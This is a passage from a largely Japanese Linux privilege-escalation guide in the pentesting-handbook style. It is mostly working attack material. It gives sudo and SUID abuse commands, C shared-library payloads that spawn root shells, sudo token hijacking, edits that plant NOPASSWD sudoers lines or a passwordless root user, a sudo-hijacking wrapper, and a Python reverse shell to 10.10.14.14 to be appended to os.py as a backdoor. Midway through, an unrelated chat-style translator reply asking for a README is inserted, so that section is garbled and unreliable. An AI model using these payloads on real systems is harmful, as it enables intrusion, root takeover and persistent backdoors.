環境内の任意のアカウントのパスワードを**知っている場合は**、そのパスワードで**各ユーザーとしてログインを試みてください**。

### Su Brute

多数のノイズを出すことを気にしない場合、かつ対象のマシンに `su` と `timeout` バイナリが存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをbrute-forceしてみることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーの brute-force も試みます。

## Writable PATH の悪用

### $PATH

$PATH のいずれかのフォルダに**書き込みできることが分かった場合**、別のユーザー（理想的には root）が実行するコマンド名で、かつ $PATH 内で**あなたの書き込み可能なフォルダより前にあるフォルダからロードされない**ものの名前を使って、書き込み可能なフォルダ内に**backdoor を作成する**ことで権限昇格できる可能性があります。

### SUDO and SUID

sudo を使って実行できるコマンドがあるか、または suid bit が設定されているコマンドがあるかもしれません。以下で確認してください:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の **予期しないコマンドは、ファイルの読み書きやコマンドの実行を可能にします。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーがパスワードを知らなくても別のユーザーの権限でコマンドを実行できることがあります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できます。root directory に ssh key を追加するか、`sh` を呼び出すことで、簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、実行中にユーザーが **環境変数を設定する** ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirerに基づく**もので、スクリプトをrootとして実行する際に任意のpythonライブラリをロードするための**PYTHONPATH hijacking**に対して**脆弱でした**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- なぜ動作するか: 非対話的なシェルでは Bash が `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root privileges で source されます。

- 要件:
- 実行可能な sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
- sudo で許可されたコマンドに対するシェルラッパーは避け、最小限のバイナリを使用する。
- 保持された環境変数が使用される場合、sudo の I/O ロギングおよびアラートを検討する。

### Sudo 実行をバイパスするパス

**Jump** 他のファイルを読むか、**symlinks** を使用する。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使用されている(\*)場合は、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary コマンドのパスが指定されていない場合

もし**sudo permission**が単一のコマンドに対してパスを指定せずに付与されている場合: _hacker10 ALL= (root) less_、PATH 変数を変更して悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリがパスを指定せずに別のコマンドを実行する場合にも使用できます（奇妙な SUID バイナリの内容は常に _**strings**_ で確認してください）。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary がコマンドのパスを指定している場合

もし**suid**バイナリがパスを指定して別のコマンドを実行している場合、suid ファイルが呼び出しているコマンド名で関数を作成し、**export a function** を試すことができます。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、その関数を作成して export してください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準の C ライブラリ（`libc.so`）を含む他のすべてのライブラリより前にロードされるように、1つ以上の共有ライブラリ（.so ファイル）をローダーに指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

ただし、特に **suid/sgid** 実行ファイルに対する悪用を防ぎシステムのセキュリティを維持するために、システムはいくつかの条件を強制します:

- ローダーは、real user ID (_ruid_) が effective user ID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行可能ファイルでは、プリロードされるのは標準パスにあり、かつ suid/sgid のライブラリのみです。

Privilege escalation は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、コマンドが `sudo` で実行されても **LD_PRELOAD** 環境変数が保持され認識されるようになり、結果として権限昇格した状態で任意のコードが実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it**を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御できる場合、同様の privesc が悪用される可能性があります。なぜならライブラリが検索されるパスを攻撃者が制御できるからです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる **SUID** 権限を持つ binary に遭遇した場合、**.so** ファイルを正しく読み込んでいるか確認するのが良い。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性を示唆します。

これを悪用するには、例えば _"/path/to/.config/libcalc.c"_ という C ファイルを作成し、以下のコードを記述します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限の shell を実行することで権限を昇格させることを目的としています。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最終的に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、潜在的に system compromise を引き起こす可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が、我々が write できる folder から library を load していることが分かったので、その folder に必要な name の library を作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリを厳選したリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに対して **only inject arguments** できるケースに特化した同様のリストです。

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- 既に _sampleuser_ としてシェルを持っていること
- _sampleuser_ have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に setuid が設定された root 所有の sh シェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ自体、またはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して**ユーザーとPIDのsudo tokenを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても以下を実行することで**sudo 権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるか、またその方法を設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取り可能です**。\
**もし**このファイルを**読む**ことができれば、**興味深い情報を取得できる可能性があります**。また、任意のファイルに**書き込み**ができれば、**escalate privileges** することができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができるなら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリの代替がいくつかあります。設定は`/etc/doas.conf`で確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

あるユーザが通常マシンに接続して `sudo` を使って権限昇格することが分かっていて、そのユーザコンテキスト内でシェルを取得している場合、**新しい sudo 実行ファイルを作成**して root としてあなたのコードを実行し、その後にユーザのコマンドを実行させることができます。次に、ユーザコンテキストの **$PATH を変更**（例えば .bash_profile に新しいパスを追加するなど）すると、ユーザが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

ユーザが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を変更します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

あるいは次のように実行することもできます：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

これは `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**他のフォルダを指し示し**、そこでは**ライブラリ**が**検索**されます。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内でライブラリを検索します**。

もし何らかの理由で **ユーザーが書き込み権限を持っている** 場合、指定されたパス（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` の設定ファイルが指す任意のフォルダ）で権限昇格が可能になることがあります.\

Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` に lib をコピーすると、`RPATH` 変数で指定されているとおり、プログラムはこの場所の lib を使用します。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って `/var/tmp` に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root privileges の**サブセットを提供します**。これにより root の **privileges がより小さく識別可能な単位に分割され**、各単位を個別にプロセスへ付与できるようになります。こうして権限の全体量が減り、exploitation のリスクが低下します。\
次のページを読んで、**capabilities とそれを悪用する方法について詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute"** ビットは該当ユーザーがフォルダに "**cd**" できることを意味します。\
**"read"** ビットはユーザーがファイルを **list** できることを意味し、**"write"** ビットはファイルを **delete** したり新しいファイルを **create** できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の第二レイヤーを表し、従来の ugo/rwx 権限を**上書きできる**ことがあります。これらの権限は、所有者でもグループでもない特定のユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**細分化により、より正確なアクセス管理が可能**になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定のACLを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell セッションを開く

**古いバージョン**では、別のユーザー（**root**）の**shell**セッションを**hijack**できることがあります。\
**最新のバージョン**では、**自分のユーザー**のscreenセッションにのみ**接続**できるようになっています。しかし、**セッション内の興味深い情報**が見つかることがあります。

### screen セッション hijacking

**screen セッションを一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** による問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) セッションをhijackすることはできませんでした。

**tmux セッションを一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションに接続する**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーはこのバグの影響を受ける可能性があります。\
このバグはそれらのOSで新しい ssh キーを作成したときに発生します。**考えられる変種は32,768通りしかなかった**ためです。つまり全ての可能性を計算でき、**ssh public key を持っていれば対応する private key を検索できる**ということです。計算された候補は次で見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key authentication が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、サーバーが空のパスワード文字列のアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

ssh を使って root がログインできるかどうかを指定します。デフォルトは `no`。可能な値:

- `yes`: root はパスワードおよび private key を使用してログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key を使用し、かつコマンドオプションが指定されている場合にのみログインできます
- `no`: ログイン不可

### AuthorizedKeysFile

ユーザー認証に使える public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）または**ユーザーのホームからの相対パス**を指定できます。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、**private** key を使ってユーザー「**testusername**」でログインしようとすると、ssh があなたのキーの public key を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（without passphrases!）鍵を置いたままにする代わりに、**use your local SSH keys instead of leaving keys** ことができます。つまり、ssh を介して **jump** し **to a host** に接続し、そこから **jump to another** ホストへ移動する際に、**using** **key** が **initial host** に配置されているものを使用できます。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
もし怪しいプロファイルスクリプトが見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OS によっては `/etc/passwd` と `/etc/shadow` が別名だったり、バックアップが存在することがあります。したがって、**それらをすべて見つけ出し**、**読み取れるか確認して**ファイル内に**ハッシュが含まれているか**を確認することをお勧めします：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内で**password hashes**を見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md の翻訳を行いますが、元のファイル内容を送ってください。翻訳後にユーザー `hacker` を追加し、生成したパスワードを記載します。

確認事項を教えてください：
- パスワードはこちらで生成してよいですか？（はい/いいえ）
- 生成する場合、長さと使用する文字種（例：英数字のみ、記号含む）を指定してください。
- `hacker` をどの位置に追加しますか？（ファイル末尾、特定のセクション名、など）

ファイル内容と上の回答をいただければ翻訳して所定箇所にユーザー情報を追加します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使えます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの**機密ファイルに書き込みができるか**確認するべきです。例えば、いくつかの**サービス構成ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを稼働していて、**modify the Tomcat service configuration file inside /etc/systemd/,** を変更できる場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### フォルダの確認

The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後のものは読み取れないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **ウェブファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### passwords を含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読むと、**passwords を含む可能性がある複数のファイル** を検索していることがわかります。\
**もう一つの興味深いツール** は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存された大量の passwords を取得するためのオープンソースのアプリケーションです。

### ログ

ログを読むことができれば、**その中に興味深い/機密情報が見つかることがあります**。ログが奇妙であればあるほど、それだけ興味深い可能性が高いです（おそらく）。\
また、一部の「**bad**」に設定された（バックドアが仕込まれている？）**audit logs** は、**audit logs** 内に **passwords** を記録することを可能にする場合があります。詳しくはこの投稿を参照してください: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むには、**ログ閲覧用のグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役に立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名やファイルの中身に "**password**" という語を含むファイルを確認し、ログ内の IP や emails、あるいは hashes regexps もチェックしてください。\
ここでこれらすべてをどう実行するかを列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最新のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もしどの場所で（**where**）python スクリプトが実行されるか分かっていて、そのフォルダに **書き込み可能**（**can write inside**）であるか、あるいは **python ライブラリを変更できる**（**modify python libraries**）のであれば、OS ライブラリを改変して backdoor を仕込むことができます（python スクリプトが実行される場所に書き込みできるなら、os.py ライブラリをコピーして貼り付ければよい）。

ライブラリに **backdoor the library** を仕込むには、os.py ライブラリの末尾に以下の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

